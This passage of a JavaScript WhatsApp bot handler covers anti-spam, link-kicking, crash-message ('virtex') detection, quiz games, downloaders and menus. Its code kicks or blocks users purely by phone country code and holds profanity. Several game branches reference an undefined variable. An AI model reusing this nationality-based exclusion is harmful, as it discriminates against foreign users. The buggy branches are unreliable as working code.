if (antiSpam && isCmd && msgFilter.isFiltered(from) && !isGroup && !itsMe && !isOwner ) {
addSpam("Case",senderNumber, "30s", AntiSpam)
addSpammer(senderNumber, spammer)
return setReply("Ups kamu terdeteksi spam")
}

//ANTI SPAM GROUP CHAT     
if (antiSpam && isCmd && msgFilter.isFiltered(from) && isGroup && !itsMe && !isOwner) {
addSpam("Case",senderNumber, "30s", AntiSpam)
addSpammer(senderNumber, spammer)
return setReply("Ups kamu terdeteksi spam")
}
if (isCmd && !isOwner) msgFilter.addFilter(from)



//-------------------- 》SECURITY《 ------------------\\

 //ANTI LINK GROUP
if (isGroup && isAntilinkGc && budy.includes(`chat.whatsapp.com`)) {
if (isGroupAdmins) return setReply('Alah sia admin grup mah bebas yekan, hampir aja ke kick :v')
if (isBotGroupAdmins) xdev.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: m.key.id, participant: sender } }) 
let linkgc = await xdev.groupInviteCode(from)
if (budy.includes(`${linkgc}`)) return reply ('Asu kirain link grup lain , huh hampir loe kena kick! :v')
reply(`「 LINK GROUP DETECTED 」`)
setTimeout(() => {
xdev.groupParticipantsUpdate(from, [sender], 'remove').catch((e) => { setReply(`BOT HARUS JADI ADMIN`) })
}, 2000)
}

 //ANTI LINK 
if (isGroup && isAntiLink){
if (budy.includes(`https:`)) { 
if (isGroupAdmins) return setReply('Alah sia admin grup mah bebas yekan :v')
let linkgc = await xdev.groupInviteCode(from)
if (budy.includes(`${linkgc}`)) return reply ('Wuanjir kirain link grup lain, huh hampir aja kena kick 😆')
if (budy.includes('zin admin') || budy.includes('zinmin') )return setReply('Izin Admin diterima')
setReply(` *「 LINK DETECTED 」*\nKamu mengirimkan link, maaf kamu di kick dari grup :(`)
setTimeout(() => {
xdev.groupParticipantsUpdate(from, [sender], 'remove').catch((e) => { setReply(`BOT HARUS JADI ADMIN`) })
}, 2000)
}
}

 //ANTI ASING/BULE OK
if (isGroup && isBotGroupAdmins && isKickarea && !itsMe) {    
let member = await groupMembers.map(u => u.id)
for ( let i = 0; i <member.length; i++){  
if (member[i].slice(0,2) !== "62" ){     	
let usersId = await groupMembers.find(u => u.id == member[i]) 
if (!usersId.groupAdmins ){
await xdev.groupParticipantsUpdate(from, [member[i]], 'remove')
await sleep(1000)
}
}
}
} 

//ANTI VIRUS
if (isGroup && isAntiVirtex && budy.length > 20000) {
if (isGroupAdmins) return setReply('*VIRTEX DETECTED*')
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
await xdev.sendMessage(from, {text:antivirus(pushname,groupName)})
if (!isBotGroupAdmins) {return }
if(isOwner) {return}
await xdev.groupParticipantsUpdate(from, [sender], 'remove')
// await xdev.groupSettingUpdate(from, 'announcement')
//await setReply("Group Telah Di Tutup")
await xdev.sendMessage(`${nomerOwner}@s.whatsapp.net`,{text: `Hai Owner! wa.me/${sender.split("@")[0]} Terdeteksi Telah Mengirim Virtex ${isGroup?`di Group ${groupName}`:''}`})
 }

//System Expired
expiredClaim(_claim)
_sewa.expiredCheck(xdev, from, sewa)
_prem.expiredCheck(premium) 

//System Expired
expiredClaim(_claim)
_sewa.expiredCheck(xdev,from,sewa)
_prem.expiredCheck(premium)
  
//AUTO REGISTER && !dev.key.fromMe && !isOwner 
if (!isHit && isCmd){ 
addUserId(gcount, limitCount, calender, pushname, senderNumber, user)
} 

//Auto Hit 
if(isCmd){
AddHit(senderNumber, user)
cmdAdd("run", "1d", hitnya)
}
expiredCmd(hitnya, dash)
const thisHit = `${getHit("run", hitnya)}`
  
//--------------------------AREA EXP USER------------------------\\
//Exp User
if ( isHit && !itsMe && isCmd ) {

try {
if (userLevel === undefined && userId === undefined) {
addUserId(gcount, limitCount, calender, pushname, senderNumber, user)
}

if (autoLevel){
addLevelingXp(senderNumber, amountExp, user)
}
if (autoLevel && userExp >= requiredExp || autoLevel && userExp == requiredExp) {
addLevelingLevel(senderNumber, 1, user)
resetLevelingXp(senderNumber, userExp, user)


let anune =`${userLevel}0000`
let susu = randomNomor(math(anune))
addBalance(senderNumber, susu, user)


//Hadiah Limit
if(userLevel >= 25){
let anuitu =`${userLevel}`
var sapi = randomNomor(math(anuitu))
giveLimit(senderNumber, sapi, user)
} else {
var sapi = "0"
}


//Hadiah Premium
if(userLevel >= 50){
var nana = randomNomor(24) + "h"
_prem.addPremiumUser (sender, nana, premium)         
} else {
var nana = "0"
}

let levelnih = userLevel + 1

let teks = `*]───「 LEVEL UP 」───[*

Selamat, kamu telah naik ke level ${levelnih}
Pangkatmu saat ini adalah 「 *${userLeveling(levelnih)}* 」
Dan kamu telah mendapatkan
💳 Saldo  : Rp ${susu}
📉 Limit : ${sapi}
🎫 Premium : ${nana.split("h")[0]} Jam`
//but = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: `ᴘʀᴏғɪʟᴇ` }, type: 1 },{ buttonId: `${prefix}shop`, buttonText: { displayText: `sʜᴏᴘ` }, type: 1 } ];         
await setReply(teks)
}
} catch (err) {
console.error(err)
}
}



//-----------------------------------------AKHIR BATAS EXP USER-->

        
//========================================================================================================================//
let colors = ['red','white','black','blue','yellow','green','magenta','cyan','pink','gold','purple','navy','gray']
const isImage = (type === 'imageMessage')
const isVideo = (type === 'videoMessage')
const isSticker = (type == 'stickerMessage')
const isAudio = (type == 'audioMessage')
const isText = (type == 'conversation')
const isMedia = (type === 'imageMessage' || type === 'videoMessage')
const isViewOnce = (type == 'viewOnceMessage')
const isAllMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'stickerMessage' || type === 'audioMessage' || type === 'contactMessage' || type === 'locationMessage')
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
const isQuotedTeks = type === 'extendedTextMessage' && content.includes('quotedMessage')
const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
const isQuotedText = type === 'extendedTextMessage' && content.includes('conversation')
const isQuotedextendedText = type === 'extendedTextMessage' && content.includes('extendedTextMessage')

/*
//AUTO BIO BOTZ FIX BY DITTAZ
var slow = false
if(slow) {

} else if(!slow) {
slow = true
setInterval(() => {
xdev.setStatus(`${fake} | ⏰ ${runtime(process.uptime() )}`)
slow = false
}, 30_000)
} 
*/
  
//AUTO RESPON SIMI BY DECODE DENPA 
if (!isGroup && !isCmd && !itsMe && autorespon && !isSticker && !isAudio && !isMedia) { 
try{
xdev.sendPresenceUpdate('composing', from)
let simi = await fetchJson(`https://api.simsimi.net/v2/?text=${body}&lc=id`, {methods: "GET"})
let sami = simi.success  
setReply(`${sami}`)
} catch (err){
console.log(err)
setReply("Simi ga tau mau ngomong apa")
}
} 




//Make Sticker
async function makeSticker(media,Sticker, StickerTypes){
let jancok = new Sticker(media, {
pushname, pack: pushname, // The pack name
author: packName, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await xdev.sendMessage(from,{sticker: nah},{quoted: dev})
await fs.unlinkSync(stok)
}

		
//DOWNLOAD MP4
const downloadMp4 = async (Link ) => {
try{
await ytdl.getInfo(Link);
let mp4File = getRandom('.mp4') 
console.log(color("Download video with ytdl-core"))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on("finish", async () => {    
await xdev.sendMessage(from, { video: fs.readFileSync(mp4File), caption: "Nih!",gifPlayback: false},{quoted: dev})
fs.unlinkSync(`./${mp4File}`)
})     
} catch(err) {
setReply(`${err}`)
}
}


//DOWNLOAD MP3
const downloadMp3 = async (Link ) => {
try{
await ytdl.getInfo(Link);
let mp3File = getRandom('.mp3') 
console.log(color("Download audio with ytdl-core"))
ytdl(Link, {filter: 'audioonly'})
.pipe(fs.createWriteStream(mp3File))
.on("finish", async () => {  
await xdev.sendMessage(from, {audio:  fs.readFileSync(mp3File), mimetype: 'audio/mp4' },{ quoted: dev })
fs.unlinkSync(mp3File)
})       
} catch (err){
console.log(color(err))
}
} 

//SOUND CLOUD DOWNLOAD MP3
const scdlMp3 = async (Link ) => {
let scdl = await SoundCloud.create();
let track = await scdl.tracks.getTrack(Link);
let mp3File = getRandom('.mp3') 
let opusFile = `${track.title}.opus`
let stream = await scdl.download(Link)
stream.pipe(fs.createWriteStream(mp3File))
.on("finish", async () => {   
	
let request = new FFMPEGRequest({
input: {
path: mp3File
},
output: {
path: opusFile,
bitrate: 128
}
});

Ffmpeg.convert(request)
.then( async filePath => {
  // Done
await xdev.sendMessage(from, {contextInfo: {
externalAdReply: {
title: 'Speed', 
body: 'Now Playing...',
description: 'Now Playing...',
mediaType: 2,
thumbnail: await (await fetch('https://telegra.ph/file/76f08bd0aeb06c3e0c0d5.jpg')).buffer(),
mediaUrl: `https://youtube.com/watch?v=uIedYGN3NQQ`
}
}, audio:  fs.readFileSync(filePath), mimetype: 'audio/mp4' },{ quoted: dev })
fs.unlinkSync(mp3File)
fs.unlinkSync(opusFile)
})
.catch(error => {
setReply(error)
})
})     
}



//SOUND CLOUD DOWNLOAD MP3 DOCUMENT
const scdlDoc= async (Link ) => {
let scdl = await SoundCloud.create();
let track = await scdl.tracks.getTrack(Link);
let mp3File = `./${track.title}.mp3`
let stream = await scdl.download(Link)
stream.pipe(fs.createWriteStream(mp3File))
.on("finish", async () => {    
await xdev.sendMessage(from, {audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' },{ quoted: dev })
fs.unlinkSync(mp3File)
})       
} 

//Console Log
try{
var virus = m.message.extendedTextMessage.contextInfo.externalAdReply.title.length
}catch{
var virus = 100
}

if(content.includes('contactMessage') && m.quoted.fakeObj.key.participant == "0@s.whatsapp.net" && m.quoted.fakeObj.key.remoteJid == "0@s.whatsapp.net"){
Log('Virtex terdeteksi')
}
  
if(budy.length > 8000 && !itsMe  || type == "extendedTextMessage" && virus > 8000 && !itsMe ||  type == "productMessage" && m.message.productMessage.product.description.length > 8000 && !itsMe ||  type == "listMessage" && !itsMe) {
if(isGroup && isBotGroupAdmins) xdev.sendMessage(from, { delete: m.key})
if(!isGroup) conn.chatModify({ clear: { messages: [{ id: m.id, fromMe: sender == botNumber? true : false, timestamp: m.messageTimestamp }] } }, sender, [])
console.log(chalk.bgRedBright(color("[ VIRTEXT ]", "black")),`Length: ${budy.length} from ${senderNumber} ${isGroup? `Group ${groupName}`: ""}`)
}
if(!isCmd && !isSticker && !isImage && !isVideo && type !== 'reactionMessage' && budy.length < 8000) console.log( isGroup? chalk.bgMagentaBright(color("[  GROUP  ]", "black")):chalk.bgGreenBright(color("[ PRIVATE ]", "black")), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), chalk.blue(budy), color('dari', 'gold'), color(`${pushname}`, 'orange'), isGroup? `${color('di gc', 'purple')} ${color(groupName, "deeppink")}` : "")
if(isCmd) console.log(chalk.bgCyanBright(color("[ COMMAND ]", "black")), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), chalk.blue(`${command} [${args.length}]`), color('dari', 'gold'), color(`${pushname}`, 'orange'), isGroup? `${color('di gc', 'purple')} ${color(groupName, "deeppink")}` : "")

//GAME MATH FUNCTION
xdev.math = xdev.math ? xdev.math : {}
if(isGroup && from in xdev.math){
console.log(xdev.math)
try{
let id = from
if (!(id in xdev.math) && /^apa hasil dari/i.test(budy)) return setReply('soal itu sudah berakhir')
let math = JSON.parse(JSON.stringify(xdev.math[id][1]))
if (budy == math.result) {
addBalance(senderNumber, math.bonus, user)
clearTimeout(xdev.math[id][3])
delete xdev.math[id]
await setReply(` benar\n\nSaldo: Rp${math.bonus}\n\nmath ${math.mode}`)
} else {    
if (--xdev.math[id][2] == 0) {
clearTimeout(xdev.math[id][3])
delete xdev.math[id]
setReply(`*kesempatan habis!*\njawabannya adalah *${math.result}*`)
} else setReply(`*jawaban salah!*\nmasih ada ${xdev.math[id][2]} kesempatan`)
}
}catch(e){
console.log(e)
}
}

//GAME Caklontong Function
conn.caklontong = conn.caklontong ? conn.caklontong : {}  
if(isGroup && from in conn.caklontong){
const buttons = [{buttonId: `${prefix}caklontong`,buttonText:{displayText: `Main Lagi`},type:1}]       
const similarity = require('similarity')
const threshold = 0.72
let id = from
let json = JSON.parse(JSON.stringify(xdev.caklontong[id][1]))
if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
let arya = randomNomor(math(3000))
addBalance(senderNumber, arya, user)
let teks = `*Jawaban Benar!*\n\nSaldo : Rp *${arya}*`
xdev.sendButMessage(from, teks, `${fake1}`, buttons) 
clearTimeout(conn.caklontong[id][3])
delete conn.caklontong[id]
} else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) reply(`*Dikit Lagi!*`)
else reply(`*Jawaban Salah!*`)
}

//GAME Tebakkata Function
conn.tebakkata = conn.tebakkata ? conn.tebakkata : {}  
if(isGroup && from in conn.tebakkata){
const buttons = [{buttonId: `${prefix}tebakkata`,buttonText:{displayText: `Main Lagi`},type:1}]       
const similarity = require('similarity')
const threshold = 0.72
let id = from
let json = JSON.parse(JSON.stringify(xdev.tebakkata[id][1]))
if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
let arya = randomNomor(math(3000))
addBalance(senderNumber, arya, user)
let teks = `*Jawaban Benar!*\n\nSaldo : Rp *${arya}*`
xdev.sendButMessage(from, teks, `${fake1}`, buttons) 
clearTimeout(conn.tebakkata[id][3])
delete conn.tebakkata[id]
} else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) reply(`*Dikit Lagi!*`)
else reply(`*Jawaban Salah!*`) 
}

//GAME Susunkata Function
conn.susunkata = conn.susunkata ? conn.susunkata : {}  
if(isGroup && from in conn.susunkata){
const buttons = [{buttonId: `${prefix}susunkata`,buttonText:{displayText: `Main Lagi`},type:1}]       
const similarity = require('similarity')
const threshold = 0.72
let id = from
let json = JSON.parse(JSON.stringify(xdev.susunkata[id][1]))
if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
let arya = randomNomor(math(3000))
addBalance(senderNumber, arya, user)
let teks = `*Jawaban Benar!*\n\nSaldo : Rp *${arya}*`
xdev.sendButMessage(from, teks, `${fake1}`, buttons) 
clearTimeout(conn.susunkata[id][3])
delete conn.susunkata[id]
} else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) reply(`*Dikit Lagi!*`)
else reply(`*Jawaban Salah!*`) 
} 

//GAME Siapahkahaku Function
conn.siapakahaku = conn.siapakahaku ? conn.siapakahaku : {}  
if(isGroup && from in conn.siapakahaku){
const buttons = [{buttonId: `${prefix}susunkata`,buttonText:{displayText: `Main Lagi`},type:1}]       
const similarity = require('similarity')
const threshold = 0.72
let id = from
let json = JSON.parse(JSON.stringify(xdev.siapakahaku[id][1]))
if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
let ngemtod = randomNomor(math(3000))
addBalance(senderNumber, ngemtod, user)
let teks = `*Jawaban Benar!*\n\nSaldo : Rp *${arya}*`
xdev.sendButMessage(from, teks, `${fake1}`, buttons) 
clearTimeout(conn.siapakahaku[id][3])
delete conn.siapakahaku[id]
} else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) reply(`*Dikit Lagi!*`)
 else reply(`*Jawaban Salah!*`) 
}

//GAME Tebakgambar Function
conn.tebakgambar = conn.tebakgambar ? conn.tebakgambar : {}  
if(isGroup && from in conn.tebakgambar){
const buttons = [{buttonId: `${prefix}susunkata`,buttonText:{displayText: `Main Lagi`},type:1}]       
const similarity = require('similarity')
const threshold = 0.72
let id = from
let json = JSON.parse(JSON.stringify(xdev.tebakgambar[id][1]))
if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
let ngemtod = randomNomor(math(3000))
addBalance(senderNumber, ngemtod, user)
let teks = `*Jawaban Benar!*\n\nSaldo : Rp *${arya}*`
xdev.sendButMessage(from, teks, `${fake1}`, buttons) 
clearTimeout(conn.tebakgambar[id][3])
delete conn.tebakgambar[id]
} else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) reply(`*Dikit Lagi!*`)
 else reply(`*Jawaban Salah!*`) 
}	

//GAME Tebakbendera Function
conn.tebakbendera = conn.tebakbendera ? conn.tebakbendera : {}  
if(isGroup && from in conn.tebakbendera){
const buttons = [{buttonId: `${prefix}susunkata`,buttonText:{displayText: `Main Lagi`},type:1}]       
const similarity = require('similarity')
const threshold = 0.72
let id = from
let json = JSON.parse(JSON.stringify(xdev.tebakbendera[id][1]))
if (budy.toLowerCase() == json.name.toLowerCase().trim()) {
let ngemtod = randomNomor(math(3000))
addBalance(senderNumber, ngemtod, user)
let teks = `*Jawaban Benar!*\n\nSaldo : Rp *${arya}*`
xdev.sendButMessage(from, teks, `${fake1}`, buttons) 
clearTimeout(conn.tebakbendera[id][3])
delete conn.tebakbendera[id]
} else if(similarity(budy.toLowerCase(), json.name.toLowerCase().trim()) >= threshold) reply(`*Dikit Lagi!*`)
 else reply(`*Jawaban Salah!*`) 
}

//GAME Tebaklirik Function
conn.tebaklirik = conn.tebaklirik ? conn.tebaklirik : {}  
if(isGroup && from in conn.tebaklirik){
const buttons = [{buttonId: `${prefix}susunkata`,buttonText:{displayText: `Main Lagi`},type:1}]       
const similarity = require('similarity')
const threshold = 0.72
let id = from
let json = JSON.parse(JSON.stringify(xdev.tebaklirik[id][1]))
if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
let arya = randomNomor(math(3000))
addBalance(senderNumber, arya, user)
let teks = `*Jawaban Benar!*\n\nSaldo : Rp *${arya}*`
xdev.sendButMessage(from, teks, `${fake1}`, buttons) 
clearTimeout(conn.tebaklirik[id][3])
delete conn.tebaklirik[id]
} else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) reply(`*Dikit Lagi!*`)
 else reply(`*Jawaban Salah!*`) 
}

//GAME Tekateki Function
conn.tekateki = conn.tekateki ? conn.tekateki : {}  
if(isGroup && from in conn.tekateki){
const buttons = [{buttonId: `${prefix}susunkata`,buttonText:{displayText: `Main Lagi`},type:1}]       
const similarity = require('similarity')
const threshold = 0.72
let id = from
let json = JSON.parse(JSON.stringify(xdev.tekateki[id][1]))
if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
let arya = randomNomor(math(3000))
addBalance(senderNumber, arya, user)
let teks = `*Jawaban Benar!*\n\nSaldo : Rp *${arya}*`
xdev.sendButMessage(from, teks, `${fake1}`, buttons) 
clearTimeout(conn.tekateki[id][3])
delete conn.tekateki[id]
} else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) reply(`*Dikit Lagi!*`)
 else reply(`*Jawaban Salah!*`) 
}

//GAME TebakTebakan Function
conn.tebaktebakan = conn.tebaktebakan ? conn.tebaktebakan : {}  
if(isGroup && from in conn.tebaktebakan){
const buttons = [{buttonId: `${prefix}susunkata`,buttonText:{displayText: `Main Lagi`},type:1}]       
const similarity = require('similarity')
const threshold = 0.72
let id = from
let json = JSON.parse(JSON.stringify(xdev.tebaktebakan[id][1]))
if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
let arya = randomNomor(math(3000))
addBalance(senderNumber, arya, user)
let teks = `*Jawaban Benar!*\n\nSaldo : Rp *${arya}*`
xdev.sendButMessage(from, teks, `${fake1}`, buttons) 
clearTimeout(conn.tebaktebakan[id][3])
delete conn.tebaktebakan[id]
} else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) reply(`*Dikit Lagi!*`)
 else reply(`*Jawaban Salah!*`) 
}

//GAME Tebakkabupate  Function
conn.tebakkabupaten = conn.tebakkabupaten ? conn.tebakkabupaten : {}  
if(isGroup && from in conn.tebakkabupaten){
const buttons = [{buttonId: `${prefix}susunkata`,buttonText:{displayText: `Main Lagi`},type:1}]       
const similarity = require('similarity')
const threshold = 0.72
let id = from
let json = JSON.parse(JSON.stringify(xdev.tebakkabupaten[id][1]))
if (budy.toLowerCase() == json.title.toLowerCase().trim()) {
let ngemtod = randomNomor(math(3000))
addBalance(senderNumber, ngemtod, user)
let teks = `*Jawaban Benar!*\n\nSaldo : Rp *${arya}*`
xdev.sendButMessage(from, teks, `${fake1}`, buttons) 
clearTimeout(conn.tebakkabupaten[id][3])
delete conn.tebakkabupaten[id]
} else if(similarity(budy.toLowerCase(), json.title.toLowerCase().trim()) >= threshold) reply(`*Dikit Lagi!*`)
 else reply(`*Jawaban Salah!*`) 
}		

//GAME AsahOtak  Function
conn.asahotak = conn.asahotak ? conn.asahotak : {}  
if(isGroup && from in conn.asahotak){
const buttons = [{buttonId: `${prefix}susunkata`,buttonText:{displayText: `Main Lagi`},type:1}]       
const similarity = require('similarity')
const threshold = 0.72
let id = from
let json = JSON.parse(JSON.stringify(xdev.asahotak[id][1]))
if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
let arya = randomNomor(math(3000))
addBalance(senderNumber, arya, user)
let teks = `*Jawaban Benar!*\n\nSaldo : Rp *${arya}*`
xdev.sendButMessage(from, teks, `${fake1}`, buttons) 
clearTimeout(conn.asahotak[id][3])
delete conn.asahotak[id]
} else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) reply(`*Dikit Lagi!*`)
 else reply(`*Jawaban Salah!*`) 
}	

//GAME TebakKimia Function
conn.tebakkimia = conn.tebakkimia ? conn.tebakkimia : {}  
if(isGroup && from in conn.tebakkimia){
const buttons = [{buttonId: `${prefix}susunkata`,buttonText:{displayText: `Main Lagi`},type:1}]       
const similarity = require('similarity')
const threshold = 0.72
let id = from
let json = JSON.parse(JSON.stringify(xdev.tebakkimia[id][1]))
if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
let arya = randomNomor(math(3000))
addBalance(senderNumber, arya, user)
let teks = `*Jawaban Benar!*\n\nSaldo : Rp *${arya}*`
xdev.sendButMessage(from, teks, `${fake1}`, buttons) 
clearTimeout(conn.tebakkimia[id][3])
delete conn.tebakkimia[id]
} else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) reply(`*Dikit Lagi!*`)
else reply(`*Jawaban Salah!*`) 
}	


const isReplySticker = type === 'stickerMessage' && content.includes('stickerMessage')
const isQuotedReplySticker = type === 'stickerMessage' && content.includes('extendedTextMessage')
const mentionByReplySticker = type == "stickerMessage" && dev.message.stickerMessage.contextInfo != null ? dev.message.stickerMessage.contextInfo.participant || "" : ""


  
//AUTO BLOCK NOMER ASING +212
let nomerAsing = senderNumber.startsWith('212') || senderNumber.startsWith('252')
if (!isGroup && nomerAsing) {
//await xdev.sendMessage(from, {image: {url: "https://telegra.ph/file/58668a8ad9af87724cd2d.jpg"},
// caption: "Fuck you bitch 🖕"})
await addBlock(sender, blocked)
console.log(`Nomer asing dari ${senderNumber}`)
return xdev.updateBlockStatus(sender, "block") 
} 

//AUTO RESPON STICKER
if (setiker.includes(messagesC)){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
let namastc = messagesC
let buffer = fs.readFileSync(`./temp/stick/${namastc}.webp`)
xdev.sendMessage(from, {sticker: buffer}, {quoted:dev })
}
	
//AUTO RESPON VN
for (let anju of audionye){
if (budy === anju){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return sendSticker(spam2)
let buffer = fs.readFileSync(`./temp/audio/${anju}.mp3`)
xdev.sendMessage(from, {audio: buffer, mimetype: 'audio/mp4'}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${pushname} \n「 audio 」 ${anju}`,"title": `Hmm`,'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}})
addSpam("NotCase",senderNumber, "10s", AntiSpam)
}
}

 
//AUTO REACT
let regex =[ "bilek","banh","cum","kntl","anjing","mmk","bang","wibu","pantek","pepek","hentai"]
for (let i of regex){
if (!cekSpam("NotCase",senderNumber, AntiSpam) && isGroup && budy.toLowerCase().includes(i)){ 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
let emot = await pickRandom(["🗿", "👍", "🙄", "😝", "😏", "💩", "👻", "🔥", "🤣","🤬", "😎", "😂", "😘", "😑", "😱", "❤️", "🔥", "😳","😍","🤩","🥳","🤔","🤗","🤤","👎","👊","🙈","🤡"])
xdev.sendMessage(from, { react: { text: emot, key: dev.key } })	
}
}

  
// BANCHAT GROUP 
if (isGroup && isBanchat) {
if (!itsMe && !isOwner) return 
}


//AUTO BLOCK CMD
for (let i = 0; i < listcmdblock.length ; i++) {
if (command === listcmdblock[i].cmd ){
if(autoblockcmd) {
return setReply(mess.block.Bsystem)
} else{
return setReply(mess.block.Bowner)
}
}
}


//FITUR KHUSUS OWNER
if(!checkDataName("commands", "", DataId)) { 
await createDataId("commands", DataId) 
}
let ownerCommands =  DataId.filter(item => item.name == "commands" )
for(let i of ownerCommands[0].id){
if(command == i && !isOwner) return onlyOwner()
}

//FITUR USER LIMIT
if(!checkDataName("limit", "", DataId)) { 
await createDataId("limit", DataId) 
}
let userLimit =  DataId.filter(item => item.name == "limit" )
for(let i of userLimit[0].id){
if(!isOwner && command == i ){
if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
limitAdd(senderNumber, user)
xdev.sendMessage(from,{text:`Limit kamu tersisa ${getLimit(senderNumber, limitCount, user)}`}, {quoted: dev})
}
}

//FITUR USER PREMIUM
if(!checkDataName("premium", "", DataId)) { 
await createDataId("premium", DataId) 
}
let userPremium =  DataId.filter(item => item.name == "premium" )
for(let i of userPremium[0].id){
if(command == i && !isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
}


  
//ANONYMOUS CHAT
const roomChat = Object.values(anonChat).find(room => [room.a, room.b].includes(m.sender) && room.state == 'CHATTING')
const roomA = Object.values(anonChat).find(room => room.a == m.sender)
const roomB = Object.values(anonChat).find(room => room.b == m.sender )
const room = Object.values(anonChat).find(room => room.state == 'WAITING' && room.b == "")

if (roomChat && !isCmd && !isGroup && roomChat.b !=="") {
let other = [roomChat.a, roomChat.b].find(user => user !== m.sender)
m.copyNForward(other, true)
}

if (room && Date.now() >= room.expired){
await xdev.sendMessage(room.a, {text:"Partner tidak di temukan\nKamu telah keluar dari room anonymous"})
anonChat.splice(anonChat.indexOf(room, 1)) 
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))

}                 




  
//add to dashboard
if(isCmd) Succes(toFirstCase(command), dash, allcommand)
// ==========================================================\\
try{
switch(command) {
	

case 'menu':
let menunya = allmenu(getLimit, senderNumber, limitCount, user, getBalance, isPremium,thisHit, publik, sender, prefix, pushname)
let fiturnya = fitur(prefix)
let mok = [{"buttonId": `${prefix}dashboard`,"buttonText": {"displayText": `ᴅᴀsʜʙᴏᴀʀᴅ`},"type": "RESPONSE"},
          {"buttonId": `${prefix}sewa`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]

    const muk = [
			
      
			 { quickReplyButton: { displayText: `ᴅᴀsʜʙᴏᴀʀᴅ`, id: `${prefix}dashboard` } },
			{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `${prefix}sewa` } }
     
		]

    
          
                    
let options1 =
{ forward,
externalAdReply: {
showAdAttribution: true, 
title: fake, 
body: copyright,
//description: 'Now Playing...',
mediaType: 1,  
renderLargerThumbnail : true,
thumbnail: fs.readFileSync('./stik/web.jpg'),
sourceUrl: `https://wa.me/${nomerOwner}`
}
}
if(setmenu == "document"){
xdev.sendButDoc(from, menunya,readmore+fiturnya,fs.readFileSync('./stik/thumbnaildokumen.jpg'), mok, options1,{quoted: setQuoted})
} else if(setmenu == "location"){
xdev.sendButLoc(from, menunya,"                      "+readmore+fiturnya+"\n"+copyright,fs.readFileSync('./stik/thumb.jpeg'), mok, options1)
} else if(setmenu == "image"){
xdev.sendButImage(from, menunya, readmore+fiturnya, fs.readFileSync('./stik/thumb.jpeg'),mok) 
} else if(setmenu == "image2"){
xdev.send5ButImg (from, menunya+readmore+"\n"+fiturnya,copyright, fs.readFileSync('./stik/thumb.jpeg'), muk) 
} else if(setmenu == "gif"){
xdev.send5ButGif (from, menunya+readmore+"\n"+fiturnya,copyright, fs.readFileSync('./stik/video.mp4'), muk,fs.readFileSync('./stik/fake gif.jpeg'),{quoted: dev}) 
} else if(setmenu == "location2"){
xdev.send5ButLoc(from, menunya+readmore+"\n"+fiturnya,copyright, fs.readFileSync('./stik/thumb.jpeg'), muk) 
} else if(setmenu == "katalog"){
xdev.sendKatalog(from, "ALL MENU BOT", menunya+readmore+"\n"+fiturnya, fs.readFileSync('./stik/thumb.jpeg'), {quoted: setQuoted})
}
break


case 'play':{
if(!q) return setReply("Teksnya mana om")
setReply(mess.wait)
let rus = await yts(q)
if(rus.all.length == "0") return setReply("Video tidak bisa di download")
let data = await rus.all.filter(v => v.type == 'video')

try{
var res = data[0]
var info = await ytdl.getInfo(res.url);
} catch{
var res = data[1]
